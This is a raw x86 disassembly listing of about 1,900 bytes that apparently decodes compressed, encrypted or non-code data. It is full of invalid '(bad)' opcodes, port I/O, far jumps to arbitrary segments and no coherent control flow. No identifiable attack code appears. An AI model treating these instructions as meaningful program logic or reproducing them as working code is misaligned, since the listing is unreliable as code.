  41eaa5:	mov    BYTE PTR [ecx+0x260ddd8a],dl
  41eaab:	xor    cl,dh
  41eaad:	jg     0x41ea5f
  41eaaf:	lods   eax,DWORD PTR ds:[esi]
  41eab0:	enter  0x5fad,0xa7
  41eab4:	push   ds
  41eab5:	aas    
  41eab6:	fist   DWORD PTR es:[eax+0x28]
  41eaba:	scas   eax,DWORD PTR es:[edi]
  41eabb:	out    0xca,al
  41eabd:	jmp    0x41ea52
  41eabf:	fiadd  WORD PTR ds:0xf260d3f6
  41eac5:	sbb    bl,BYTE PTR [esi-0xec1a150]
  41eacb:	xchg   ch,dl
  41eacd:	mov    esp,0x6371d23b
  41ead2:	leave  
  41ead3:	(bad)  [esi+0x287e9c23]
  41ead9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eada:	dec    edx
  41eadb:	ins    BYTE PTR es:[edi],dx
  41eadc:	jecxz  0x41ea7f
  41eade:	scas   eax,DWORD PTR es:[edi]
  41eadf:	sub    eax,0xa3281d62
  41eae4:	addr16 push ecx
  41eae6:	lahf   
  41eae7:	ja     0x41eb58
  41eae9:	add    ecx,ecx
  41eaeb:	sbb    DWORD PTR [eax-0x2a],0xf23156ad
  41eaf2:	sbb    esp,DWORD PTR [ecx-0x68]
  41eaf5:	and    al,0xd2
  41eaf7:	and    BYTE PTR [edi],0x3f
  41eafa:	jmp    0x41eb48
  41eafc:	loopne 0x41eb1a
  41eafe:	cmp    eax,0xe04ca616
  41eb03:	test   DWORD PTR [eax+0x53cac452],edi
  41eb09:	mov    ch,0x70
  41eb0b:	xchg   DWORD PTR [ebx],edx
  41eb0d:	or     bl,BYTE PTR [ebx+0x73]
  41eb10:	call   0xd061d11e
  41eb15:	leave  
  41eb16:	test   BYTE PTR [edx-0x4c34690d],ah
  41eb1c:	add    eax,0x1e268b26
  41eb21:	nop
  41eb22:	mov    ah,0xf3
  41eb24:	xchg   edi,eax
  41eb25:	cld    
  41eb26:	ins    DWORD PTR es:[edi],dx
  41eb27:	push   edi
  41eb28:	mov    ebp,0xbe5ac6bc
  41eb2d:	enter  0xe4e5,0x6f
  41eb31:	xchg   BYTE PTR [edx+ebp*2],ch
  41eb34:	mov    DWORD PTR gs:[ecx+0x1cdebed2],edx
  41eb3b:	mov    fs,WORD PTR [eax+eiz*4-0x67]
  41eb3f:	bnd je 0x41eacd
  41eb42:	iret   
  41eb43:	xor    ah,BYTE PTR [edx]
  41eb45:	mov    al,0x76
  41eb47:	jbe    0x41eb66
  41eb49:	sti    
  41eb4a:	mov    eax,0xe2d82bc8
  41eb4f:	push   ss
  41eb50:	ja     0x41eae1
  41eb52:	jmp    0x41ebb5
  41eb54:	cmp    BYTE PTR [esi-0x3b],dl
  41eb57:	in     eax,0xdf
  41eb59:	adc    ebx,DWORD PTR [edx+eax*8]
  41eb5c:	jg     0x41eb1c
  41eb5e:	jno    0x41eae3
  41eb60:	adc    DWORD PTR [edx],edx
  41eb62:	(bad)  
  41eb63:	pop    ds
  41eb64:	bound  ebx,QWORD PTR [ecx-0x5d4b5f67]
  41eb6a:	int    0x27
  41eb6c:	in     al,dx
  41eb6d:	ds in  eax,0x9d
  41eb70:	ss dec ebp
  41eb72:	data16 fisttp QWORD PTR [ebx+edi*1]
  41eb76:	mov    ds:0xa40fa2f0,al
  41eb7b:	in     al,dx
  41eb7c:	rol    BYTE PTR [edx-0x60],1
  41eb7f:	sbb    DWORD PTR [edi],0xffffffde
  41eb82:	dec    ebx
  41eb83:	mov    esi,0xc41198e1
  41eb88:	lods   al,BYTE PTR ds:[esi]
  41eb89:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41eb8b:	cmp    eax,0xd246a6a7
  41eb90:	scas   eax,DWORD PTR es:[edi]
  41eb91:	xchg   ecx,eax
  41eb92:	or     cl,ah
  41eb94:	adc    al,0xd3
  41eb96:	cmc    
  41eb97:	bound  ecx,QWORD PTR [esi+ebx*1-0x80]
  41eb9b:	cwde   
  41eb9c:	stc    
  41eb9d:	cld    
  41eb9e:	mov    al,ah
  41eba0:	and    esp,DWORD PTR [ecx+ecx*4]
  41eba3:	fs add al,0xf7
  41eba6:	ins    BYTE PTR es:[edi],dx
  41eba7:	lahf   
  41eba8:	bound  ebx,QWORD PTR [edx-0x2a65fece]
  41ebae:	sub    ah,BYTE PTR [esi-0x7d4e76a7]
  41ebb4:	icebp  
  41ebb5:	sub    al,0xee
  41ebb7:	enter  0x1eff,0xfb
  41ebbb:	loope  0x41ebbe
  41ebbd:	jne    0x41ebec
  41ebbf:	ja     0x41ebfc
  41ebc1:	stos   BYTE PTR es:[edi],al
  41ebc2:	mov    ecx,0x4f74b37b
  41ebc7:	cli    
  41ebc8:	je     0x41eb82
  41ebca:	(bad)  
  41ebcb:	cmp    al,0x38
  41ebcd:	je     0x41ec24
  41ebcf:	jo     0x41eb73
  41ebd1:	addr16 xchg ecx,eax
  41ebd3:	cmp    BYTE PTR [ecx-0x6a],0x91
  41ebd7:	loope  0x41ec36
  41ebd9:	(bad)  
  41ebda:	in     al,0x22
  41ebdc:	sub    BYTE PTR [edx+ebp*2-0x3],dh
  41ebe0:	imul   ecx,DWORD PTR ss:[edx],0xffffff93
  41ebe4:	repz (bad) 
  41ebe7:	lea    esp,[esi-0x7879cfda]
  41ebed:	lahf   
  41ebee:	push   es
  41ebef:	dec    ebx
  41ebf0:	retf   
  41ebf1:	daa    
  41ebf2:	out    dx,eax
  41ebf3:	imul   eax,ebp,0x4e
  41ebf6:	add    ah,BYTE PTR [ebx+0x45]
  41ebf9:	and    ebp,ebx
  41ebfb:	push   ebx
  41ebfc:	add    eax,0x4f093671
  41ec01:	pop    ebx
  41ec02:	push   ebp
  41ec03:	xchg   esi,eax
  41ec04:	bound  edi,QWORD PTR [edi+0x26]
  41ec07:	cli    
  41ec08:	jmp    0xccdf:0x97ddb9c8
  41ec0f:	pop    esp
  41ec10:	mov    cl,0xf1
  41ec12:	mov    ds:0x1d20a70,al
  41ec17:	repnz icebp 
  41ec19:	inc    esp
  41ec1a:	pop    esp
  41ec1b:	cld    
  41ec1c:	inc    eax
  41ec1d:	test   eax,0x17c10b63
  41ec22:	add    eax,0xcaf40117
  41ec27:	jl     0x41ebd4
  41ec29:	and    bl,BYTE PTR [edx]
  41ec2b:	jmp    0x41ec40
  41ec2d:	mov    bh,0x21
  41ec2f:	cmp    eax,0x3fb0b2de
  41ec34:	push   0xc09363e3
  41ec39:	imul   BYTE PTR [edi]
  41ec3b:	sbb    BYTE PTR [esi+0x34],dl
  41ec3e:	push   0x808d5e38
  41ec43:	cmp    cl,BYTE PTR [ebx-0x3d]
  41ec46:	out    dx,eax
  41ec47:	lods   al,BYTE PTR ds:[esi]
  41ec48:	jnp    0x41ec6b
  41ec4a:	enter  0x1c16,0xd9
  41ec4e:	addr16 sbb al,0x98
  41ec51:	test   eax,0x4db64d40
  41ec56:	(bad)  
  41ec57:	idiv   esi
  41ec59:	jnp    0x41ec55
  41ec5b:	(bad)  
  41ec5c:	mov    esp,0xcfa50831
  41ec61:	sub    esi,DWORD PTR [ebp-0x1b]
  41ec64:	aad    0xf7
  41ec66:	mov    esp,0xe959550d
  41ec6b:	in     eax,0x26
  41ec6d:	iret   
  41ec6e:	jno    0x41ec7a
  41ec70:	loopne 0x41ec70
  41ec72:	add    ebx,edi
  41ec74:	in     eax,0x91
  41ec76:	pop    eax
  41ec77:	pushf  
  41ec78:	cmp    bh,BYTE PTR [ebx+edx*4+0x24e1926a]
  41ec7f:	dec    esi
  41ec80:	mov    BYTE PTR [esp+esi*8-0x18],dh
  41ec84:	lahf   
  41ec85:	fadd   QWORD PTR ds:0x3515b922
  41ec8b:	mov    bh,0xf1
  41ec8d:	dec    eax
  41ec8e:	stos   DWORD PTR es:[edi],eax
  41ec8f:	inc    esp
  41ec90:	js     0x41ec44
  41ec92:	dec    edx
  41ec93:	sub    cl,BYTE PTR [eax-0x65]
  41ec96:	mov    eax,ds:0xa5b6e0cc
  41ec9b:	cs jecxz 0x41ec8c
  41ec9e:	jmp    0x4733:0x60d07de7
  41eca5:	xchg   BYTE PTR [edx-0x3d],bl
  41eca8:	outs   dx,DWORD PTR ds:[esi]
  41eca9:	xor    BYTE PTR ds:[esi],0xd0
  41ecad:	stc    
  41ecae:	lods   eax,DWORD PTR ds:[esi]
  41ecaf:	sbb    ecx,edi
  41ecb1:	pop    ss
  41ecb2:	in     eax,dx
  41ecb3:	push   esp
  41ecb4:	js     0x41ec84
  41ecb6:	repnz inc eax
  41ecb8:	xchg   edx,eax
  41ecb9:	adc    eax,0x4b502853
  41ecbe:	aas    
  41ecbf:	jecxz  0x41eca6
  41ecc1:	jg     0x41ed0a
  41ecc3:	push   ebp
  41ecc4:	pop    eax
  41ecc5:	mov    edi,gs
  41ecc7:	scas   eax,DWORD PTR es:[edi]
  41ecc8:	pop    ss
  41ecc9:	aad    0x2f
  41eccb:	xchg   edi,eax
  41eccc:	cdq    
  41eccd:	pop    ecx
  41ecce:	pop    esp
  41eccf:	out    dx,al
  41ecd0:	or     al,0xa3
  41ecd2:	lar    ebp,WORD PTR [eax-0x7b]
  41ecd6:	addr16 in al,0x23
  41ecd9:	fs in  al,0x5c
  41ecdc:	scas   eax,DWORD PTR es:[edi]
  41ecdd:	cld    
  41ecde:	push   cs
  41ecdf:	xor    ebp,0xfedcb6aa
  41ece5:	push   esi
  41ece6:	hlt    
  41ece7:	inc    ebp
  41ece8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ece9:	pop    es
  41ecea:	sahf   
  41eceb:	mov    bl,0x9d
  41eced:	xchg   DWORD PTR [ecx],esi
  41ecef:	aad    0x5a
  41ecf1:	(bad)  
  41ecf2:	jne    0x41ec7f
  41ecf4:	(bad)  
  41ecf5:	dec    esp
  41ecf6:	sub    eax,0xbef8db5b
  41ecfb:	and    eax,0x33192245
  41ed00:	scas   eax,DWORD PTR es:[edi]
  41ed01:	bound  ebx,QWORD PTR [ebp+0x7b]
  41ed04:	inc    ebx
  41ed05:	pop    ds
  41ed06:	stc    
  41ed07:	xor    DWORD PTR [eax],esi
  41ed09:	loopne 0x41ecfe
  41ed0b:	mov    ebp,0x35e3d0b9
  41ed10:	dec    ebx
  41ed11:	sti    
  41ed12:	inc    eax
  41ed13:	pop    es
  41ed14:	jle    0x41ecbd
  41ed16:	mov    ch,0x1a
  41ed18:	call   0x3153:0x4fe2481e
  41ed1f:	mov    ecx,0xb1bc6d36
  41ed24:	cwde   
  41ed25:	cmp    al,0x7
  41ed27:	cli    
  41ed28:	cmp    DWORD PTR [eax],eax
  41ed2a:	pop    eax
  41ed2b:	outs   dx,DWORD PTR ds:[esi]
  41ed2c:	scas   eax,DWORD PTR es:[edi]
  41ed2d:	dec    al
  41ed2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed30:	sub    al,0x20
  41ed32:	pop    ss
  41ed33:	mov    al,BYTE PTR [eax-0x1]
  41ed36:	xor    al,0xa6
  41ed38:	shl    DWORD PTR [ecx+0x2146726a],cl
  41ed3e:	sub    DWORD PTR [ebp-0x7d2ee734],eax
  41ed44:	mov    ebx,0x75d9c038
  41ed49:	pushf  
  41ed4a:	inc    ecx
  41ed4b:	dec    ebx
  41ed4c:	popa   
  41ed4d:	jbe    0x41ed4b
  41ed4f:	mov    ecx,0x98bc47d
  41ed54:	ficom  DWORD PTR [eax]
  41ed56:	sub    edx,eax
  41ed58:	dec    ecx
  41ed59:	xchg   esp,eax
  41ed5a:	sub    DWORD PTR [eax+0x15],eax
  41ed5d:	fcom   DWORD PTR [edx+0x45caeb8b]
  41ed63:	xlat   BYTE PTR ds:[ebx]
  41ed64:	cs pop ss
  41ed66:	or     DWORD PTR fs:[esi],esi
  41ed69:	jmp    0xf22f:0xb350fb49
  41ed70:	mov    edi,0x5814acce
  41ed75:	ror    DWORD PTR [ecx],cl
  41ed77:	inc    edx
  41ed78:	es xchg edx,eax
  41ed7a:	mov    eax,0x7983203
  41ed7f:	push   0xa4494509
  41ed84:	les    esp,FWORD PTR [eax-0x32]
  41ed87:	xor    BYTE PTR [edx+0x6aed66b6],0x13
  41ed8e:	out    0xa7,al
  41ed90:	int    0x2e
  41ed92:	push   ebp
  41ed93:	iret   
  41ed94:	or     BYTE PTR [edi],al
  41ed96:	sbb    eax,0xf4127b21
  41ed9b:	popa   
  41ed9c:	or     DWORD PTR [ebx-0x43990c85],eax
  41eda2:	mov    esp,0x685a4711
  41eda7:	mov    ebx,ss
  41eda9:	jne    0x41edff
  41edab:	fadd   QWORD PTR [ecx+0x7b79044c]
  41edb1:	xchg   esi,eax
  41edb2:	dec    eax
  41edb3:	or     bl,BYTE PTR [edx*2-0x67beb06a]
  41edba:	sbb    DWORD PTR [ecx-0x7a037eb0],ebx
  41edc0:	out    0x4f,eax
  41edc2:	xchg   edx,eax
  41edc3:	jb     0x41ed89
  41edc5:	(bad)  
  41edc6:	or     dh,ch
  41edc8:	mov    dl,0x7e
  41edca:	push   ss
  41edcb:	js     0x41ede5
  41edcd:	jmp    0x2286:0xc802839a
  41edd4:	popf   
  41edd5:	int    0xdd
  41edd7:	setno  BYTE PTR [esp+edx*4]
  41eddb:	mov    ebp,0x3a78bf9c
  41ede0:	inc    ebp
  41ede1:	je     0x41ee2f
  41ede3:	adc    al,0xb6
  41ede5:	xcrypt-ecb (bad)
  41ede6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ede7:	iret   
  41ede8:	or     al,0xee
  41edea:	inc    ecx
  41edeb:	pop    eax
  41edec:	repz cmp DWORD PTR [ebp+0x35],edi
  41edf0:	push   ebp
  41edf1:	pop    ebx
  41edf2:	push   0x0
  41edf4:	mov    esi,0xb3c22de0
  41edf9:	mov    esi,0xbdb11988
  41edfe:	cs ins BYTE PTR es:[edi],dx
  41ee00:	inc    edi
  41ee01:	jbe    0x41edc5
  41ee03:	pusha  
  41ee04:	outs   dx,BYTE PTR ds:[esi]
  41ee05:	dec    ebp
  41ee06:	inc    ecx
  41ee07:	mov    cl,0x47
  41ee09:	push   ebp
  41ee0a:	test   eax,0x90b7ff9e
  41ee0f:	dec    ebp
  41ee10:	cdq    
  41ee11:	ret    
  41ee12:	inc    ebx
  41ee13:	imul   ebp,ebx,0x35
  41ee16:	mov    eax,ds:0x1ad7f210
  41ee1b:	stc    
  41ee1c:	dec    edx
  41ee1d:	test   eax,0x8b35c37d
  41ee22:	pop    ss
  41ee23:	enter  0x9120,0x3
  41ee27:	pop    edx
  41ee28:	sub    eax,DWORD PTR [ebp+ebp*2+0x15686307]
  41ee2f:	test   BYTE PTR [ebp-0x68],dh
  41ee32:	pop    ebx
  41ee33:	cli    
  41ee34:	bound  esi,QWORD PTR cs:[ebx+edx*8+0x670c8749]
  41ee3c:	(bad)  
  41ee3d:	adc    edx,DWORD PTR [edi+eiz*2-0x23]
  41ee41:	out    dx,al
  41ee42:	sub    al,0x2d
  41ee44:	out    dx,al
  41ee45:	push   0xffffffc1
  41ee47:	hlt    
  41ee48:	(bad)  
  41ee49:	mov    eax,0x8fce6242
  41ee4e:	mov    al,ds:0x624f6e56
  41ee53:	pushf  
  41ee54:	call   0xb6c10c0a
  41ee59:	pop    esi
  41ee5a:	(bad)  
  41ee5b:	retf   0xa59a
  41ee5e:	bound  ebp,QWORD PTR [edi+edi*4-0x6a820ade]
  41ee65:	lds    esi,FWORD PTR [ecx]
  41ee67:	cmp    DWORD PTR [edx+0xf029ba9],0x2e3b7230
  41ee71:	lds    ebp,FWORD PTR [eax]
  41ee73:	sbb    BYTE PTR [ecx-0x549fc366],al
  41ee79:	shl    BYTE PTR [eax],0x77
  41ee7c:	pop    es
  41ee7d:	arpl   WORD PTR [ebx+0x3fbadaa9],si
  41ee83:	mov    edi,0xfb32b5a0
  41ee88:	cwde   
  41ee89:	pop    esp
  41ee8a:	and    BYTE PTR [edi-0x3699125c],al
  41ee90:	mov    dh,0x7d
  41ee92:	mov    bl,0x2
  41ee94:	out    dx,al
  41ee95:	iret   
  41ee96:	or     dl,ah
  41ee98:	scas   al,BYTE PTR es:[edi]
  41ee99:	pop    edx
  41ee9a:	inc    ecx
  41ee9b:	xchg   ebx,eax
  41ee9c:	call   FWORD PTR [ebp-0x6d]
  41ee9f:	sar    ch,cl
  41eea1:	xor    eax,0x9855e1cd
  41eea6:	dec    ebx
  41eea7:	(bad)  
  41eea8:	int    0xd4
  41eeaa:	retf   
  41eeab:	(bad)  
  41eeac:	mov    ch,0xed
  41eeae:	in     eax,dx
  41eeaf:	push   ds
  41eeb0:	jg     0x41eede
  41eeb2:	rcr    DWORD PTR [ebx-0x27],cl
  41eeb5:	stos   DWORD PTR es:[edi],eax
  41eeb6:	jns    0x41ee65
  41eeb8:	retf   
  41eeb9:	inc    esi
  41eeba:	(bad)  
  41eebb:	out    dx,al
  41eebc:	test   eax,0xe58384e1
  41eec1:	adc    BYTE PTR [edx],0x9e
  41eec4:	mov    esp,0x21ee2d7b
  41eec9:	dec    edx
  41eeca:	xor    ah,dl
  41eecc:	xchg   DWORD PTR ds:0x6ce67810,edi
  41eed2:	adc    dl,al
  41eed4:	stos   BYTE PTR es:[edi],al
  41eed5:	repnz mov ds:0xe89fc810,eax
  41eedb:	ins    DWORD PTR es:[edi],dx
  41eedc:	in     eax,0x52
  41eede:	leave  
  41eedf:	sbb    BYTE PTR [eax-0x6b],al
  41eee2:	es mov dl,0xd8
  41eee5:	mov    eax,ds:0x6da4f362
  41eeea:	sbb    al,0x83
  41eeec:	jns    0x41ef4c
  41eeee:	adc    eax,0x1b1f0a3b
  41eef3:	es ins DWORD PTR es:[edi],dx
  41eef5:	dec    ebx
  41eef6:	mov    ch,0xce
  41eef8:	cli    
  41eef9:	and    BYTE PTR [eax+ebx*2-0x2b],0x16
  41eefe:	sub    DWORD PTR [eax],edi
  41ef00:	xchg   esp,eax
  41ef01:	sub    al,ah
  41ef03:	and    al,0xb2
  41ef05:	inc    edx
  41ef06:	adc    bl,bh
  41ef08:	(bad)  
  41ef09:	not    BYTE PTR [edx+ecx*8]
  41ef0c:	pop    eax
  41ef0d:	shl    cl,1
  41ef0f:	add    DWORD PTR [ebp+0x4af04c7c],0xcdc7b2ff
  41ef19:	pop    ebx
  41ef1a:	xchg   ebx,eax
  41ef1b:	xchg   ebp,eax
  41ef1c:	push   ebx
  41ef1d:	mov    ecx,0x311a82c8
  41ef22:	iret   
  41ef23:	pop    ebx
  41ef24:	nop
  41ef25:	loope  0x41ef20
  41ef27:	clc    
  41ef28:	aas    
  41ef29:	xchg   esp,eax
  41ef2a:	jns    0x41eedd
  41ef2c:	ret    
  41ef2d:	scas   al,BYTE PTR es:[edi]
  41ef2e:	fisubr WORD PTR [esi-0x55]
  41ef31:	test   eax,0xa7378fb8
  41ef36:	in     eax,0x9e
  41ef38:	dec    ebx
  41ef39:	fsub   DWORD PTR [ebx-0x2288e323]
  41ef3f:	mov    esi,0xf9c88b88
  41ef44:	fbld   TBYTE PTR [esi-0x3c]
  41ef47:	cmc    
  41ef48:	fisub  DWORD PTR [ecx-0x5b]
  41ef4b:	mov    dl,0x4f
  41ef4d:	mov    ebx,0xc8411f8e
  41ef52:	jl     0x41ef95
  41ef54:	push   edi
  41ef55:	dec    eax
  41ef56:	lods   al,BYTE PTR ds:[esi]
  41ef57:	popf   
  41ef58:	push   ecx
  41ef59:	ja     0x41eeff
  41ef5b:	ret    
  41ef5c:	jnp    0x41efda
  41ef5e:	and    eax,0x277026f5
  41ef63:	sub    BYTE PTR [esi],bl
  41ef65:	pop    ds
  41ef66:	and    BYTE PTR [ecx-0x303ff946],0x47
  41ef6d:	sbb    BYTE PTR [esi+eax*1+0x1a],ah
  41ef71:	mov    dl,0x4e
  41ef73:	seto   BYTE PTR ds:[esi]
  41ef77:	jp     0x41efdd
  41ef79:	sbb    DWORD PTR ds:0x3a47f351,esi
  41ef7f:	imul   eax,DWORD PTR [edi+0x10],0xdaaf6f60
  41ef86:	inc    edx
  41ef87:	addr16 call 0xbc6d:0x761b2dc7
  41ef8f:	mov    ebx,0x69b00e0d
  41ef94:	xchg   ecx,eax
  41ef95:	ins    BYTE PTR es:[edi],dx
  41ef96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef97:	push   ebp
  41ef98:	test   eax,0x63fb08c3
  41ef9d:	and    BYTE PTR [edi+0x6c862d67],0xaf
  41efa4:	jno    0x41eff7
  41efa6:	push   ebx
  41efa7:	int3   
  41efa8:	cmp    ch,BYTE PTR [esi-0x77573c64]
  41efae:	test   BYTE PTR [ebp-0x54f2fcc3],0x75
  41efb5:	je     0x41f014
  41efb7:	inc    ecx
  41efb8:	cld    
  41efb9:	cmp    BYTE PTR [edi+0x71],ah
  41efbc:	jmp    0x1a07:0xbd84e006
  41efc3:	or     bh,bh
  41efc5:	adc    BYTE PTR [eax-0x7e98bc59],0x62
  41efcc:	mov    cl,0xc5
  41efce:	out    dx,eax
  41efcf:	jmp    0x630:0x507ba8fd
  41efd6:	ja     0x41efc3
  41efd8:	pop    edi
  41efd9:	xchg   ecx,eax
  41efda:	fistp  QWORD PTR [bp+si+0x60]
  41efde:	lahf   
  41efdf:	stos   BYTE PTR es:[edi],al
  41efe0:	adc    dh,BYTE PTR [ecx+0x4b58701]
  41efe6:	inc    ebp
  41efe7:	inc    edx
  41efe8:	je     0x41f02c
  41efea:	imul   esp,DWORD PTR [ecx+0x2f88cb57],0xffffff94
  41eff1:	push   es
  41eff2:	cmp    BYTE PTR [ecx+0x3a],dh
  41eff5:	mov    ah,0x8e
  41eff7:	dec    edx
  41eff8:	in     eax,dx
  41eff9:	add    eax,0xff5a9e5f
  41effe:	sub    dh,0xc3
  41f001:	fwait
  41f002:	push   ebp
  41f003:	arpl   WORD PTR [ebx],dx
  41f005:	sub    DWORD PTR [ebp-0x22],eax
  41f008:	mov    WORD PTR [ebp-0x2d71404a],es
  41f00e:	sub    dl,dl
  41f010:	scas   al,BYTE PTR es:[edi]
  41f011:	dec    ebx
  41f012:	jmp    0x2f151590
  41f017:	mov    BYTE PTR [edx+0x67a3800c],ah
  41f01d:	mov    ch,0xdb
  41f01f:	lahf   
  41f020:	dec    eax
  41f021:	dec    esp
  41f022:	aaa    
  41f023:	lea    eax,[esi+0x13532f1f]
  41f029:	pop    eax
  41f02a:	ss aad 0x1f
  41f02d:	mov    edi,0x252cd87d
  41f032:	add    al,0x97
  41f034:	mov    ?,WORD PTR [edi-0x1e]
  41f037:	mov    al,ds:0xe268bd48
  41f03c:	dec    ecx
  41f03d:	mov    ah,0x64
  41f03f:	ret    0xda77
  41f042:	push   cs
  41f043:	cwde   
  41f044:	dec    ebx
  41f045:	xor    al,0xb1
  41f047:	pop    ds
  41f048:	sub    al,0xfe
  41f04a:	sahf   
  41f04b:	nop
  41f04c:	sub    BYTE PTR [ebx],bl
  41f04e:	cli    
  41f04f:	call   0x8a67:0xf06a540a
  41f056:	stc    
  41f057:	repz dec ecx
  41f059:	push   ss
  41f05a:	scas   eax,DWORD PTR es:[edi]
  41f05b:	aam    0xb1
  41f05d:	or     eax,0x23b2987f
  41f062:	nop
  41f063:	mov    edx,0x64c33d17
  41f068:	stos   DWORD PTR es:[edi],eax
  41f069:	imul   edi,DWORD PTR [edi],0x60d9ee8e
  41f06f:	and    al,0xb8
  41f071:	xchg   ebp,eax
  41f072:	jo     0x41f0d9
  41f074:	mov    ch,0xf4
  41f076:	ds dec eax
  41f078:	add    al,0x7b
  41f07a:	xor    eax,0x7414b4e5
  41f07f:	pop    ebp
  41f080:	inc    ebx
  41f081:	push   ebp
  41f082:	ds pop ss
  41f084:	imul   ebx,DWORD PTR [edi+0x5f],0x8a292cb8
  41f08b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f08c:	scas   al,BYTE PTR es:[edi]
  41f08d:	ds retf 0xee45
  41f091:	fnstcw WORD PTR [ebx]
  41f093:	mov    esp,0xa9abee4a
  41f098:	jno    0x41f04b
  41f09a:	loop   0x41f0dc
  41f09c:	mov    bl,0x15
  41f09e:	mov    ebx,0x9ea0db29
  41f0a3:	adc    ebp,edx
  41f0a5:	xchg   esp,eax
  41f0a7:	pop    eax
  41f0a8:	pushf  
  41f0a9:	sub    BYTE PTR [edi],0xa4
  41f0ac:	pop    ds
  41f0ad:	pop    eax
  41f0ae:	mov    dl,0xb4
  41f0b0:	push   eax
  41f0b1:	stos   DWORD PTR es:[edi],eax
  41f0b2:	mov    ah,BYTE PTR [edx-0x735100a9]
  41f0b8:	xor    eax,0xe18d63f8
  41f0bd:	mov    ecx,0x72b20cc2
  41f0c2:	or     al,0x7d
  41f0c4:	mov    esp,DWORD PTR [eax+0x439ac747]
  41f0ca:	out    dx,al
  41f0cb:	jecxz  0x41f05c
  41f0cd:	sahf   
  41f0ce:	cmp    eax,0x8ab1a63b
  41f0d3:	scas   al,BYTE PTR es:[edi]
  41f0d4:	test   al,0xba
  41f0d6:	adc    DWORD PTR [eax],0x4304af70
  41f0dc:	dec    esi
  41f0dd:	repz hlt 
  41f0df:	mov    cl,0xd
  41f0e1:	or     al,0x8e
  41f0e3:	sti    
  41f0e4:	push   0x62111630
  41f0e9:	push   0xd162a58d
  41f0ee:	dec    dl
  41f0f0:	sbb    al,0x99
  41f0f2:	sbb    al,0xe5
  41f0f4:	aas    
  41f0f5:	dec    esi
  41f0f6:	cmp    esi,esp
  41f0f8:	aam    0x78
  41f0fa:	jnp    0x41f168
  41f0fc:	mov    bl,0x75
  41f0fe:	pop    es
  41f0ff:	je     0x41f094
  41f101:	dec    esp
  41f102:	xchg   ebp,eax
  41f103:	cmp    al,0x19
  41f105:	je     0x41f169
  41f107:	ds das 
  41f109:	inc    eax
  41f10a:	pop    esi
  41f10b:	div    edi
  41f10d:	cdq    
  41f10e:	sar    edi,cl
  41f110:	cmovo  edx,edi
  41f113:	jmp    0x816b:0xc59a77a5
  41f11a:	mov    edi,0x6e478b6c
  41f11f:	mov    ah,0x1e
  41f121:	adc    eax,0xec5be118
  41f126:	lods   al,BYTE PTR ds:[esi]
  41f127:	add    bh,BYTE PTR [ebp-0x2a]
  41f12a:	das    
  41f12b:	push   ebx
  41f12c:	inc    ecx
  41f12d:	add    BYTE PTR [edi-0x20],dh
  41f130:	or     eax,0x6d9a94dd
  41f135:	lods   eax,DWORD PTR ds:[esi]
  41f136:	cdq    
  41f137:	mov    ebp,0x3ef66ea8
  41f13c:	outs   dx,DWORD PTR ds:[esi]
  41f13d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f13e:	or     al,0xa1
  41f140:	pushf  
  41f141:	ret    0x6ac0
  41f144:	popa   
  41f145:	mov    esi,DWORD PTR [ecx]
  41f147:	in     eax,0xe
  41f149:	je     0x41f14a
  41f14b:	dec    ebx
  41f14c:	gs push edi
  41f14e:	iret   
  41f14f:	xchg   ecx,eax
  41f150:	cmp    eax,0xc3bc5415
  41f155:	sbb    eax,edi
  41f157:	mov    edi,0x608d213a
  41f15c:	xchg   ebp,eax
  41f15d:	adc    BYTE PTR [edi+0x5700a880],al
  41f163:	jge    0x41f151
  41f165:	fwait
  41f166:	aad    0x5a
  41f168:	addr16 inc edi
  41f16a:	adc    ecx,DWORD PTR cs:[ecx-0x7e]
  41f16e:	jnp    0x41f11d
  41f170:	xor    eax,0x77b486ed
  41f175:	sub    BYTE PTR [edi+0x42aa6a25],cl
  41f17b:	mov    ebx,0x22274d74
  41f180:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f181:	out    dx,al
  41f182:	dec    edx
  41f183:	sti    
  41f184:	cdq    
  41f185:	mov    bh,0xc9
  41f187:	pop    es
  41f188:	sbb    al,0x7a
  41f18a:	push   ebp
  41f18b:	(bad)  
  41f18c:	out    0xfb,al
  41f18e:	or     edx,DWORD PTR [edi]
  41f190:	xchg   edi,eax
  41f191:	cmp    al,0x7a
  41f193:	cdq    
  41f194:	jmp    0x7a74e678
  41f199:	stos   DWORD PTR es:[edi],eax
  41f19a:	add    DWORD PTR [ebx+0x30],ebx
  41f19d:	jge    0x41f141
  41f19f:	inc    edi
  41f1a0:	xor    edi,DWORD PTR [edi+0x1b19aa21]
  41f1a6:	ins    DWORD PTR es:[edi],dx
  41f1a7:	ror    DWORD PTR [edi],0xbd
  41f1aa:	std    
  41f1ab:	test   DWORD PTR [ebp+0x1a42bdc],0x3c49cdf0
  41f1b5:	fcom   QWORD PTR [eax-0x5430a140]
  41f1bb:	jg     0x41f223
  41f1bd:	adc    eax,ebp
  41f1bf:	retf   0x5dcf
  41f1c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1c3:	sub    ebp,DWORD PTR [edx]
  41f1c5:	adc    eax,0xdddc8137
  41f1ca:	push   ebp
  41f1cb:	adc    eax,0xabeb3d9a
  41f1d0:	clc    
  41f1d1:	mov    BYTE PTR [esi-0x6b],dh
  41f1d4:	jmp    0xcc0d:0x9152b514
  41f1db:	cmp    eax,0x7006b576
  41f1e0:	fs (bad) 
  41f1e2:	aam    0xd7
  41f1e4:	sbb    ebp,edi
  41f1e6:	xchg   ebx,eax
  41f1e7:	test   al,dl
  41f1e9:	test   BYTE PTR [ebx+0x59c31f96],dh
  41f1ef:	call   0x12873d8a
  41f1f4:	cmp    DWORD PTR [edx],esi
  41f1f6:	out    0x2b,eax
  41f1f8:	or     DWORD PTR [ebx-0x7d76e0c],0x18321adf
  41f202:	ins    DWORD PTR es:[edi],dx
  41f203:	cmp    al,0x35
  41f205:	test   DWORD PTR [ebp-0x2a],edi
  41f208:	cmp    esp,DWORD PTR [ecx-0x3fe4c3fd]
  41f20e:	pushf  
  41f20f:	test   BYTE PTR [edx-0x14],cl
  41f212:	pop    ss
